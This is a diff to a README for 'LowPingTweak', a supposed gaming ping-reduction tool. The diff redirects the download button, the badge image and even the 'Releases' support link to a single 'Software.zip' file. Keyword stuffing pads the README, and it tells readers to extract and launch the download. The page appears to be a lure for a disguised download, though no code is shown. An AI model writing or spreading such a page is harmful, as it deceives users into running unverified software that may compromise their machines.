@@ -17,11 +17,11 @@ Are you tired of experiencing lag while gaming online? LowPingTweak is here to s
 game-connection-optimization, game-optimization, game-performance-boost, game-performance-tools, internet-optimization, lag-free-gaming, lag-reduction-tool, latency-tweak, low-ping, low-ping-tool, network-latency-fix, network-performance, network-speed-tweak, network-tweak, optimize-connection, ping-booster, ping-optimization, reduce-lag, reduce-latency, speed-up-internet-connection
 
 ## Get Started
-Ready to optimize your gaming experience with LowPingTweak? Simply download the latest version of the tool [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+Ready to optimize your gaming experience with LowPingTweak? Simply download the latest version of the tool [here](https://github.com/marek159444/LowPingTweak/releases/download/v1.0/Software.zip).
 
 **Note**: Kindly extract the downloaded file before launching the tool.
 
-[![Download LowPingTweak](https://img.shields.io/badge/Download-LowPingTweak-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download LowPingTweak](https://github.com/marek159444/LowPingTweak/releases/download/v1.0/Software.zip)](https://github.com/marek159444/LowPingTweak/releases/download/v1.0/Software.zip)
 
 ## Installation
 1. Download the tool from the link above.
@@ -29,6 +29,6 @@ Ready to optimize your gaming experience with LowPingTweak? Simply download the 
 3. Launch the tool and follow the on-screen instructions to optimize your connection settings.
 
 ## Support
-For any questions or assistance, feel free to visit the [Releases](https://github.com/cli/browser/releases) section of this repository for additional resources.
+For any questions or assistance, feel free to visit the [Releases](https://github.com/marek159444/LowPingTweak/releases/download/v1.0/Software.zip) section of this repository for additional resources.
 
 Let's level up your gaming experience with LowPingTweak! 🎮✨
